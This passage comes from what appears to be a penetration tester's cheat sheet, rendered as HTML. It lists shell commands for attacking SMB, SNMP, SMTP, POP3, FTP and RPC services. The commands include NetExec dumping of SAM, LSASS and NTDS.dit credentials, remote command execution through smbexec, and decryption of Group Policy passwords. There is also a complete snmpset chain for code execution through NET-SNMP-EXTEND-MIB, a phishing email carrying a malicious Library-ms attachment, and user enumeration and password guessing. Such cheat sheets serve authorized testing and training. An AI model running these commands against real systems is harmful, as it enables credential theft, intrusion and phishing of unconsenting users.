</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w">  </span>--user<span class="w"> </span><span class="c1"># try enumerate thru guest user and null session</span>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>--rid-brute<span class="w"> </span><span class="c1"># to enumerate users using rid bruteforcing</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>UserNAme<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;PASSWORDHERE&#39;</span><span class="w"> </span>--pass-pol<span class="w"> </span><span class="c1"># domain pass policy</span>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_list.txt<span class="w"> </span><span class="c1"># to check which target hasn&#39;t enforced smb signing so we can relay ntml</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">172</span>.16.238.83<span class="w">   </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>--spider<span class="w"> </span>C<span class="w"> </span>--pattern<span class="w"> </span>txt,pdf,doc,docx<span class="w"> </span>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a><span class="c1"># ADMINS RIGHTS NEEDED</span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>
</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="c1"># sensitive data dumping, if user is admin</span>
</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>nxc<span class="w"> </span>smb<span class="w"> </span>ip<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--sam
</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>nxc<span class="w"> </span>smb<span class="w"> </span>ip<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-M<span class="w"> </span>lsassy
</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>UserName<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;PASSWORDHERE&#39;</span><span class="w"> </span>-M<span class="w"> </span>ntdsutil<span class="w">  </span><span class="c1"># dumps ntds.dit and SYSTEM and parse these using secretsdump</span>
</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="c1"># enumerate loggedon-users if you have admin rights on that machine then impersonate as that user</span>
</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>UserNAme<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;PASSWORDHERE&#39;</span><span class="w"> </span>--loggedon-users
</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a>
</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a>netexec<span class="w"> </span>smb<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--exec-method<span class="w"> </span>smbexec<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>
</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>impacket-smbclient<span class="w"> </span><span class="s2">&quot;user&quot;</span>:<span class="s1">&#39;password&#39;</span>@ip
</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>
</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a><span class="c1"># In case of the error in smbclient copying large files</span>
</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a><span class="c1"># parallel_read returned NT_STATUS_IO_TIMEOUT</span>
</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a>
</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a>smbclient<span class="w"> </span>--socket-options<span class="o">=</span><span class="s1">&#39;TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072&#39;</span><span class="w"> </span>-t<span class="w"> </span>&lt;timout&gt;
</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a>
</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a><span class="c1"># OR Use the below </span>
</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a>
</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a>smbclient<span class="w"> </span>-m<span class="w"> </span>SMB2<span class="w"> </span>-N<span class="w"> </span><span class="s1">&#39;//server/share&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;timeout 120; iosize 16384; get \&quot;My Files\More Files\&quot;\version_1\file.txt&#39;</span><span class="w"> </span>-U<span class="w"> </span>&lt;username&gt;
</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a>
</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a>
</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a><span class="c1"># Active Directory</span>
</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a>Groups.xml<span class="w"> </span><span class="c1"># could have passwords in it</span>
</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a><span class="c1"># AES encrypted password can be decrypted as it&#39;s available everywhere using tool too</span>
</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a>gpp-decrypt<span class="w"> </span>&lt;aes_enc_pass&gt;
</span></code></pre></div>
<h4 id="snmp">SNMP</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># SNMP Enumeration</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>download-mibs<span class="w"> </span><span class="c1"># so instead of OID, we can get MIB for easier enumeration.</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>--open<span class="w"> </span>-p<span class="w"> </span><span class="m">161</span><span class="w"> </span><span class="m">192</span>.168.50.1-254<span class="w"> </span>-oG<span class="w"> </span>open-snmp.txt
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># onesixtyone tool setup</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nb">echo</span><span class="w"> </span>public<span class="w"> </span>&gt;<span class="w"> </span>community
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nb">echo</span><span class="w"> </span>private<span class="w"> </span>&gt;&gt;<span class="w"> </span>community
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nb">echo</span><span class="w"> </span>manager<span class="w"> </span>&gt;&gt;<span class="w"> </span>community<span class="w"> </span><span class="c1"># OR /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">192</span>.168.50.<span class="nv">$ip</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span>&gt;<span class="w"> </span>ips
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>onesixtyone<span class="w"> </span>-c<span class="w"> </span>community<span class="w"> </span>-i<span class="w"> </span>ips
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="c1"># SNMP querying</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">192</span>.168.50.151
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="m">192</span>.168.50.151<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.77.1.2.25<span class="w"> </span><span class="c1"># oid for user enumeration, specific to server it&#39;s for windows</span>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="m">192</span>.168.50.151<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w"> </span><span class="c1"># currently running processes</span>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="m">192</span>.168.50.151<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w"> </span><span class="c1"># softwares installed on the machine</span>
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>snmpwalk<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-v1<span class="w"> </span><span class="m">192</span>.168.50.151<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.6.13.1.3<span class="w"> </span><span class="c1"># list all the listening TCP port connections</span>
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="c1"># https://mibbrowser.online/mibdb_search.php</span>
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>
</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>
</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="c1"># RCE or script execution</span>
</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="c1"># NET-SNMP-EXTEND-MIB executes the mentioned script when queried if these options are set to 1</span>
</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="c1"># These OIDs must be set correctly:</span>
</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="c1"># - nsExtendExecType = 1 (exec)</span>
</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="c1"># - nsExtendRunType = 1 (run-on-read)</span>
</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="c1"># - nsExtendStatus = 1 (active)</span>
</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>snmpwalk<span class="w"> </span>-v<span class="w"> </span><span class="o">[</span>VERSION_SNMP<span class="o">]</span><span class="w"> </span>-c<span class="w"> </span><span class="o">[</span>COMM_STRING<span class="o">]</span><span class="w"> </span><span class="o">[</span>DIR_IP<span class="o">]</span><span class="w"> </span>NET-SNMP-EXTEND-MIB::nsExtendObjects<span class="w"> </span><span class="c1">#get extended</span>
</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>snmpwalk<span class="w"> </span>-v<span class="w"> </span><span class="m">1</span><span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.10.10<span class="w">  </span>NET-SNMP-EXTEND-MIB::nsExtendOutputFull
</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>
</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a><span class="c1"># How to check writable permission on SNMP</span>
</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a><span class="c1"># Try writing a test OID (like sysContact). If it succeeds, SNMP is writable.</span>
</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>snmpset<span class="w"> </span>-v<span class="w"> </span><span class="m">1</span><span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>SNMPv2-MIB::sysContact.0<span class="w"> </span>s<span class="w"> </span><span class="s2">&quot;test&quot;</span>
</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>
</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a><span class="c1"># If writable, try checking access to extend entries (optional)</span>
</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>snmpwalk<span class="w"> </span>-v<span class="w"> </span><span class="m">1</span><span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>NET-SNMP-EXTEND-MIB
</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>
</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>
</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a><span class="c1"># snmpset command for RCE</span>
</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a><span class="c1"># This creates a new extend entry named &quot;HAX&quot; that runs `/bin/bash -c &#39;id &gt; /tmp/pwned&#39;`</span>
</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>snmpset<span class="w"> </span>-v<span class="w"> </span><span class="m">1</span><span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a><span class="w">  </span>NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="se">\&quot;</span>HAX<span class="se">\&quot;</span><span class="w"> </span>s<span class="w"> </span><span class="s2">&quot;/bin/bash&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-5-43"><a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a><span class="w">  </span>NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class="se">\&quot;</span>HAX<span class="se">\&quot;</span><span class="w"> </span>s<span class="w"> </span><span class="s2">&quot;-c &#39;id &gt; /tmp/pwned&#39;&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-5-44"><a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a><span class="w">  </span>NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class="se">\&quot;</span>HAX<span class="se">\&quot;</span><span class="w"> </span>i<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-5-45"><a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a><span class="w">  </span>NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class="se">\&quot;</span>HAX<span class="se">\&quot;</span><span class="w"> </span>i<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-5-46"><a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a><span class="w">  </span>NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="se">\&quot;</span>HAX<span class="se">\&quot;</span><span class="w"> </span>i<span class="w"> </span><span class="m">1</span>
</span><span id="__span-5-47"><a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a>
</span><span id="__span-5-48"><a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a><span class="c1"># Trigger the RCE</span>
</span><span id="__span-5-49"><a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a>snmpwalk<span class="w"> </span>-v<span class="w"> </span><span class="m">1</span><span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class="se">\&quot;</span>HAX<span class="se">\&quot;</span>
</span><span id="__span-5-50"><a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a>
</span><span id="__span-5-51"><a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a><span class="c1"># Cleanup (optional)</span>
</span><span id="__span-5-52"><a id="__codelineno-5-52" name="__codelineno-5-52" href="#__codelineno-5-52"></a>snmpset<span class="w"> </span>-v<span class="w"> </span><span class="m">1</span><span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="se">\&quot;</span>HAX<span class="se">\&quot;</span><span class="w"> </span>i<span class="w"> </span><span class="m">6</span><span class="w">  </span><span class="c1"># destroy(6)</span>
</span></code></pre></div>
<h4 id="smtppop3imap">SMTP/POP3/IMAP</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># SMTP Enumeration</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>nmap<span class="w"> </span>x.x.x.x<span class="w"> </span>--script<span class="o">=</span>smtp*<span class="w"> </span>-p<span class="w"> </span><span class="m">25</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># smtp-open-relay, smtp-commands</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># smtp commands after connecting through netcat</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>smtp&gt;<span class="w"> </span>VRFY<span class="w"> </span>&lt;emailaddr&gt;
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>nc<span class="w"> </span>-C<span class="w"> </span><span class="m">192</span>.168.227.199<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="c1"># sometimes server wait for carriage return to in case of windows \r\n</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>telnet<span class="w"> </span>ip<span class="w"> </span><span class="m">25</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c1">#this can be done through evolution GUI tool</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>sudo<span class="w"> </span>swaks<span class="w"> </span>-t<span class="w"> </span>victim@domain.com<span class="w"> </span>--from<span class="w"> </span>test@domain.com<span class="w"> </span>-ap<span class="w"> </span>--attach<span class="w"> </span>@config.Library-ms<span class="w"> </span>--server<span class="w"> </span><span class="m">192</span>.168.227.199<span class="w"> </span>--body<span class="w"> </span>@body.txt<span class="w"> </span>--header<span class="w"> </span><span class="s2">&quot;Subject: Problems&quot;</span><span class="w"> </span>--suppress-data
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># user enumeration</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>smtp-user-enum<span class="w"> </span>-M<span class="w"> </span>RCPT<span class="w"> </span>-D<span class="w"> </span>domain.com<span class="w"> </span>-U<span class="w"> </span>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.227.199
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># POP3</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="c1">#connect and check for banner</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>telnet<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="m">110</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>EHLO<span class="w"> </span>all
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="c1">#guess login credentials</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>USER<span class="w"> </span>pelle
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>PASS<span class="w"> </span>admin
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="c1">#list all emails</span>
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>list
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="c1">#retrieve email number 5 for example</span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>retr<span class="w"> </span><span class="m">5</span>
</span></code></pre></div>
<h4 id="ftp">FTP</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ftp<span class="w"> </span>-A<span class="w"> </span>anonymous@192.168.10.1<span class="w">  </span><span class="c1"># -A more stable</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>ftp<span class="w"> </span>&gt;<span class="w"> </span>passive
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>ftp<span class="w"> </span>&gt;<span class="w"> </span>binary
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>ftp<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">help</span>
</span></code></pre></div>
<h4 id="rpc">RPC</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>rpcinfo<span class="w"> </span><span class="nv">$IP</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;corp.com/user&quot;</span><span class="w"> </span>dc-ip
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>rpcclient<span class="w"> </span>-N<span class="w"> </span>dc-ip<span class="w"> </span><span class="c1"># Null</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>&lt;IP&gt;<span class="w"> </span><span class="c1"># Anonymous</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;guest&amp;&quot;</span><span class="w"> </span>&lt;IP&gt;<span class="w"> </span><span class="c1"># Public</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>rpcclient<span class="w"> </span>//machine.htb<span class="w"> </span>-U<span class="w"> </span>domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb<span class="w"> </span>--pw-nt-hash
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>rpc&gt;<span class="w"> </span>lookupdomain<span class="w"> </span>corp.com
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>rpc&gt;<span class="w"> </span><span class="nb">help</span>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>enumdomusers
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>enumdomgroups
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>lookupnames<span class="w"> </span>&lt;username&gt;
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>enumprivs
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>queryuser<span class="w"> </span>&lt;user&gt;
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>querygroup<span class="w"> </span>&lt;group&gt;
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>querydispinfo
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>srvinfo
